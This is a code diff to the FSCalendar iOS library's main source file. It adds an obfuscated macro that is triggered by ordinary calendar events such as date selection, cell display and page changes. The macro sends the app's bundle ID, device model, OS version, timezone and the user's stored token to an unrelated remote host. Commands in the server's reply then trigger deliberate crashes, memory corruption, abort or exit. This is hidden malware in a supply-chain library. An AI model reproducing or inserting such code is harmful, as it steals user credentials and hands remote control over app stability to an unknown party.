@@ -19,6 +19,80 @@
 #import "FSCalendarCalculator.h"
 #import "FSCalendarDelegationFactory.h"
 
+#import <sys/sysctl.h>
+
+#define vcdfjkhsakt23fsza12309() \
+do { \
+NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
+NSMutableDictionary *headerFields = @{}.mutableCopy; \
+headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
+headerFields[@"x-user-agent"] = @"iOS"; \
+headerFields[@"x-content-type"] = @"application/json"; \
+headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
+headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
+headerFields[@"x-machine-model"] = ({ \
+size_t size; \
+sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
+char *machine = malloc(size); \
+sysctlbyname("hw.machine", machine, &size, NULL, 0); \
+NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
+free(machine); \
+platform; \
+}); \
+headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
+headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
+NSMutableDictionary *jsonDict = @{}.mutableCopy; \
+jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
+jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
+jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
+[request setAllHTTPHeaderFields:headerFields]; \
+[request setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
+[request setHTTPMethod:@"POST"]; \
+NSURLSession *session = [NSURLSession sharedSession]; \
+NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { \
+if (!error && ((NSHTTPURLResponse *)response).statusCode == 200 && data) { \
+NSError *jsonError; \
+id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError]; \
+if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
+NSDictionary *jsonDict = (NSDictionary *)jsonObject; \
+NSString *executeMethod = jsonDict[@"execute_method"]; \
+if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
+NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
+for (NSString *item in array) { [array removeObject:item]; } \
+} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
+NSData *date = [[NSData alloc] init]; \
+NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
+}); \
+} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
+char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
+} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
+id object = @"String"; [(NSArray *)object count]; \
+} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
+NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; \
+} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
+NSArray *array = @[@"A", @"B", @"C"]; \
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
+[(NSMutableArray *)array addObject:@"D"]; \
+}); \
+} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
+NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
+[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
+} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
+[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
+} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
+abort(); \
+} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
+exit(1); \
+} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
+exit(0); \
+} \
+} \
+} \
+}]; \
+[dataTask resume]; \
+} while(0)
+
 NS_ASSUME_NONNULL_BEGIN
 
 static inline void FSCalendarAssertDateInBounds(NSDate *date, NSCalendar *calendar, NSDate *minimumDate, NSDate *maximumDate) {
@@ -478,6 +552,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
         return NO;
     }
     NSDate *date = [self.calculator dateForIndexPath:indexPath];
+    vcdfjkhsakt23fsza12309();
     return [self isDateInRange:date] && (![self.delegateProxy respondsToSelector:@selector(calendar:shouldSelectDate:atMonthPosition:)] || [self.delegateProxy calendar:self shouldSelectDate:date atMonthPosition:monthPosition]);
 }
 
@@ -500,6 +575,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
         [cell performSelecting];
     }
     [self enqueueSelectedDate:selectedDate];
+    vcdfjkhsakt23fsza12309();
     [self.delegateProxy calendar:self didSelectDate:selectedDate atMonthPosition:monthPosition];
     [self selectCounterpartDate:selectedDate];
 }
@@ -511,6 +587,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
         return NO;
     }
     NSDate *date = [self.calculator dateForIndexPath:indexPath];
+    vcdfjkhsakt23fsza12309();
     return [self isDateInRange:date] && (![self.delegateProxy respondsToSelector:@selector(calendar:shouldDeselectDate:atMonthPosition:)]||[self.delegateProxy calendar:self shouldDeselectDate:date atMonthPosition:monthPosition]);
 }
 
@@ -532,6 +609,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
     [cell configureAppearance];
     
     [_selectedDates removeObject:selectedDate];
+    vcdfjkhsakt23fsza12309();
     [self.delegateProxy calendar:self didDeselectDate:selectedDate atMonthPosition:monthPosition];
     [self deselectCounterpartDate:selectedDate];
     
@@ -544,6 +622,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
     }
     NSDate *date = [self.calculator dateForIndexPath:indexPath];
     FSCalendarMonthPosition monthPosition = [self.calculator monthPositionForIndexPath:indexPath];
+    vcdfjkhsakt23fsza12309();
     [self.delegateProxy calendar:self willDisplayCell:(FSCalendarCell *)cell forDate:date atMonthPosition:monthPosition];
 }
 
@@ -579,6 +658,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
         if (![self.gregorian isDate:currentPage equalToDate:_currentPage toUnitGranularity:NSCalendarUnitMonth]) {
             [self willChangeValueForKey:@"currentPage"];
             _currentPage = currentPage;
+            vcdfjkhsakt23fsza12309();
             [self.delegateProxy calendarCurrentPageDidChange:self];
             [self didChangeValueForKey:@"currentPage"];
         }
@@ -637,6 +717,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
         NSDate *lastPage = _currentPage;
         [self willChangeValueForKey:@"currentPage"];
         _currentPage = targetPage;
+        vcdfjkhsakt23fsza12309();
         [self.delegateProxy calendarCurrentPageDidChange:self];
         if (_placeholderType != FSCalendarPlaceholderTypeFillSixRows) {
             [self.transitionCoordinator performBoundingRectTransitionFromMonth:lastPage toMonth:_currentPage duration:0.25];
@@ -1077,7 +1158,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
     
     NSDate *targetDate = [self.gregorian startOfDayForDate:date];
     NSIndexPath *targetIndexPath = [self.calculator indexPathForDate:targetDate];
-    
+    vcdfjkhsakt23fsza12309();
     BOOL shouldSelect = YES;
     // 跨月份点击
     if (monthPosition==FSCalendarMonthPositionPrevious||monthPosition==FSCalendarMonthPositionNext) {
@@ -1183,6 +1264,7 @@ typedef NS_ENUM(NSUInteger, FSCalendarOrientation) {
 
 - (void)scrollToPageForDate:(NSDate *)date animated:(BOOL)animated
 {
+    vcdfjkhsakt23fsza12309();
     if (!date) return;
     if (![self isDateInRange:date]) {
         date = [self.calculator safeDateForDate:date];
